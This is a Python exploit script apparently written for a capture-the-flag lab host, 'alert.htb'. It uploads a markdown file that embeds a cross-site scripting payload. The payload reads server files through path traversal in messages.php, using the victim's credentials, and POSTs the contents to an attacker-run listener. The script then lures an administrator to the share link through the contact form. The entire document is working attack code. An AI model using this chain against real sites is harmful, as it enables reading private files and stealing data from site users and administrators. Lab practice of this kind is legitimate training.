#!/usr/bin/env python3

import requests
import http.server
import socketserver
import threading
import sys
import re
import time
import socket

# Listener
PORT = 8989
LHOST = "10.10.16.9"  # EDIT THIS

stop_server = threading.Event()  # Use an Event to control the listener shutdown


def send_post_request(user_input):
    url = "http://alert.htb/visualizer.php"
    headers = {
        "Host": "alert.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------54305404821089074193738206100",
        "Origin": "http://alert.htb",
        "Connection": "close",
        "Referer": "http://alert.htb/index.php?page=alert",
        "Upgrade-Insecure-Requests": "1",
    }
    data = f"""
-----------------------------54305404821089074193738206100
Content-Disposition: form-data; name="file"; filename="exploit.md"
Content-Type: text/markdown

<script>
fetch("http://alert.htb/messages.php?file=../../../../../{user_input}", {{ 
    credentials: "include"
}})
.then(response => response.text())
.then(data => {{
    fetch("http://{LHOST}:{PORT}/steal", {{ 
        method: "POST",
        body: data
    }});
}});
</script>
-----------------------------54305404821089074193738206100--
"""

    response = requests.post(url, headers=headers, data=data)
    return response.text


def extract_share_link(response_text):
    match = re.search(r'href="http://alert.htb/visualizer.php\?link_share=(.+?)"', response_text)
    if match:
        return match.group(1)
    return None


def extract_pre_content(post_data):
    match = re.search(r"<pre>(.*?)</pre>", post_data, re.DOTALL)
    if match:
        return match.group(1)
    return None


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True  # Enable port reuse


def start_listener():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers["Content-Length"])
            post_data = self.rfile.read(content_length).decode()
            pre_content = extract_pre_content(post_data)
            if pre_content:
                print("Captured data:")
                print(pre_content)
            else:
                print("Captured data but no <pre> content found.")
            self.send_response(200)
            self.end_headers()
            stop_server.set()  # Signal to stop the server

    try:
        with ReusableTCPServer(("", PORT), Handler) as httpd:
            print("Listening on port", PORT)
            while not stop_server.is_set():
                httpd.handle_request()
            print("Shutting down the server...")
            httpd.server_close()
    except OSError as e:
        print(f"Server error: {e}")


def send_contact_form(share_link):
    url = "http://alert.htb/contact.php"
    headers = {
        "Host": "alert.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://alert.htb",
        "Connection": "close",
        "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!",
        "Upgrade-Insecure-Requests": "1",
    }
    data = f"email=asdasd%40asdasd.com&message=http%3A%2F%2Falert.htb%2Fvisualizer.php%3Flink_share%3D{share_link}"
    response = requests.post(url, headers=headers, data=data)
    return response.text


if __name__ == "__main__":
    # User input from command line argument
    if len(sys.argv) != 2:
        print("Usage: python3 exp.py <user_input>")
        sys.exit(1)

    user_input = sys.argv[1]

    # Step 1: Make the post request
    response_text = send_post_request(user_input)

    # Step 2: Extract the share link
    share_link = extract_share_link(response_text)
    if share_link:
        print("Share link extracted:", share_link)

        # Step 3: Start a listener to capture the response
        listener_thread = threading.Thread(target=start_listener)
        listener_thread.start()

        # Step 4: Make a post request with the share link
        contact_response = send_contact_form(share_link)

        # Wait for the listener to stop or timeout
        listener_thread.join(timeout=10)  # Timeout after 10 seconds

        if listener_thread.is_alive():
            print("Listener thread did not stop. Forcing shutdown.")
            stop_server.set()  # Ensure the server stops
    else:
        print("Failed to extract share link.")
